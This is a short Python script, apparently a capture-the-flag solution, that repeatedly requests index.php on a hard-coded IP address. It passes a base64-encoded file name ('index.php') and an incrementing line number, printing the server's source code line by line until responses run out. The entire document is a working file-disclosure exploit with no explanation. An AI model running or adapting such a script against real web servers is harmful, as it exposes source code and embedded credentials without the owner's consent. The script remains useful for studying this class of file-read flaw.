import requests
num = 0
while True:
    num += 1
    url = 'http://114.67.246.176:18408/index.php?line=' + str(
        num) + '&filename=aW5kZXgucGhw'
    text = requests.get(url)
    print(text.text)
    if text.text == '':
        exit()
